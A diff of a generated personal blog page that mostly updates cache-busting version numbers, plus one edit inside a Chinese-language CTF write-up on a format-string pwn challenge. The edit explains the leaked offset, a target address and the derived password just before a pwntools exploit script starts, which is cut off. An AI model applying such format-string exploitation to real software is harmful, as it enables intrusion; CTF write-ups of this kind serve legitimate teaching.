@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://cc-nianchu.github.io/favicon.ico?v=1626489472345">
+<link rel="shortcut icon" href="https://cc-nianchu.github.io/favicon.ico?v=1626536740029">
 <link rel="stylesheet" href="https://cc-nianchu.github.io/styles/main.css">
 
 
@@ -37,7 +37,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://cc-nianchu.github.io">
-        <img src="https://cc-nianchu.github.io/images/avatar.png?v=1626489472345" class="site-logo">
+        <img src="https://cc-nianchu.github.io/images/avatar.png?v=1626536740029" class="site-logo">
         <h1 class="site-title">nianchu</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -245,7 +245,8 @@ q.interactive()
 Hello,AAAA 0xffe1b8d8 0x63 (nil) 0xf7f8da9c 0x3 0xf7f60410 0x1 (nil) 0x1 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
 ��s��your passwd:
 </code></pre>
-<p>我们可以发现第十个就是偏移量，现在也找到偏移量也找到函数地址0x804c044，直接上EXP</p>
+<p>我们可以发现第十个就是偏移量，现在也找到偏移量也找到函数地址0x804c044，<br>
+而密码就是4 * len(p32()) = 0x10直接上EXP</p>
 <pre><code>from pwn import*
 #q=process(&quot;./pwn5&quot;)
 
